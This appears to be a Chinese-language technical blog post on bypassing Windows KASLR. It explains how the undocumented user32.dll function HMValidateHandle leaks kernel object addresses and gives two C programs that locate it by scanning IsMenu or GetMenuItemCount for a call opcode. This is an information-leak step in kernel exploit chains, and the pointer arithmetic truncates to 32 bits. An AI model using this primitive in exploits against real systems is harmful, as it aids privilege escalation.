---
title: HMValidateHandle
tags: windows
---

## 0x00 前言

一个典型的漏洞利用过程大概分为以下几步：

触发漏洞 —> 信息泄露 —> 构造读写原语 —> 代码执行

信息泄露的目的是利用一些泄露内核内存地址信息的方法，绕过 KASLR

## 0x01 KASLR

Windows vista 之后，微软对内核默认启用了 ASLR，即 KASLR，KASLR随机化了模块的加载基址，内核对象地址等，作为漏洞缓解的一种手段。对抗 KASLR 最直接的方法就是使用未公开函数或 Windows 内核信息泄露漏洞泄露内核内存地址信息。

## 0x02 HMValidateHandle

HMValidateHandle 是 user32.dll 中一个内部未公开的函数，他需要两个参数：handle、handle_type，通过查找句柄表，如果句柄与类型匹配，对象将会被复制到用户内存中，如果对象包含指向自身的指针，比如tagWND，HMValidateHandle 就能用来泄露内核内存地址。在 Windows 10 RS4 之后，微软关闭了这个函数。

## 0x03 查找HMValidateHandle

用 IDA 分析 user32.dll，查找到函数 isMenu：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329095914.png)

可以看到 HMVaildateHandle 在此函数中被调用，因此只要查找此函数，找到 opcode 等于 e80，就可以找到HMValidateHandle 的地址。

整个代码流程为：

![image-20210909183005095](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329095917.png)

## 0x04 代码

```C
#include <Windows.h>
#include <stdio.h>

#ifdef _WIN64
typedef void* (NTAPI *lHMValidateHandle)(HWND h, int type);
#else
typedef void* (_fastcall *lHMValidateHandle)(HWND h, int type);
#endif

lHMValidateHandle pHmValidateHandle = NULL;

BOOL FindHMValidateHandle()
{
  HMODULE hUser32 = LoadLibraryA("user32.dll");  // 加载 user32.dll
  if (hUser32 == NULL)
  {
    printf("Failed to load user32.dll");
    return FALSE;
  }

  BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");  // 检索 user32.dll 中的输出库函数 IsMenu 地址

  if (pIsMenu == NULL)
  {
    printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
    return FALSE;
  }

  unsigned int uiHMValidateHandleOffset = 0;

  //寻找第一个 Call 的偏移，即 HMValidateHandle 的偏移
  for (unsigned int i = 0; i < 0x1000; i++)
  {
    BYTE* test = pIsMenu + i;
    if (*test == 0xE8)
    {
      uiHMValidateHandleOffset = i + 1;
      break;
    }
  }
  if (uiHMValidateHandleOffset == 0)
  {
    printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
    return FALSE;
  }

  unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);  // 获取 HMValidateHandle 对应的操作数

  pHmValidateHandle = (lHMValidateHandle)((unsigned int)pIsMenu + 11 + addr);  //要CALL的地址 = E8 后面的硬编码 + 下一条指令地址，11 是 CALL 的下一条指令相对 IsMenu 的偏移

  return TRUE;

}

int main()
{
  BOOL isFound = FindHMValidateHandle();
  printf("The address of HmValidateHandle is 0x%x", pHmValidateHandle);
}

```


![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329095921.png)

## 0x05 代码2

有上面的操作流程可知，只要调用了 HMValidateHandle 的函数都可以用来寻找 HMValidateHandle 的函数地址。

IDA查看引用：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329095924.png)

挑选偏移较小的函数，如 GetMenuItemCount：

![](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329095926.png)

首次调用的依然是 HMValideateHandle，因此可以直接修改代码为：

```C
#include <Windows.h>
#include <stdio.h>

#ifdef _WIN64
typedef void* (NTAPI *lHMValidateHandle)(HWND h, int type);
#else
typedef void* (_fastcall *lHMValidateHandle)(HWND h, int type);
#endif

lHMValidateHandle pHmValidateHandle = NULL;

BOOL FindHMValidateHandle()
{
  HMODULE hUser32 = LoadLibraryA("user32.dll");  // 加载 user32.dll
  if (hUser32 == NULL)
  {
    printf("Failed to load user32.dll");
    return FALSE;
  }

  BYTE* pGetMenuItemCount = (BYTE*)GetProcAddress(hUser32, "GetMenuItemCount");  // 检索 user32.dll 中的输出库函数 GetMenuItemCount 地址

  if (pGetMenuItemCount == NULL)
  {
    printf("Failed to find location of exported function 'GetMenuItemCount' within user32.dll\n");
    return FALSE;
  }

  unsigned int uiHMValidateHandleOffset = 0;

  //寻找第一个 Call 的偏移，即 HMValidateHandle 的偏移
  for (unsigned int i = 0; i < 0x1000; i++)
  {
    BYTE* test = pGetMenuItemCount + i;
    if (*test == 0xE8)
    {
      uiHMValidateHandleOffset = i + 1;
      break;
    }
  }
  if (uiHMValidateHandleOffset == 0)
  {
    printf("Failed to find offset of HMValidateHandle from location of 'GetMenuItemCount'\n");
    return FALSE;
  }

  unsigned int addr = *(unsigned int*)(pGetMenuItemCount + uiHMValidateHandleOffset);  // 获取 HMValidateHandle 对应的操作数

  pHmValidateHandle = (lHMValidateHandle)((unsigned int)pGetMenuItemCount + 11 + addr);  //要CALL的地址 = E8 后面的硬编码 + 下一条指令地址，11 是 CALL 的下一条指令相对 GetMenuItemCount 的偏移

  return TRUE;

}

int main()
{
  BOOL isFound = FindHMValidateHandle();
  printf("The address of HmValidateHandle is 0x%x",pHmValidateHandle);
}
```

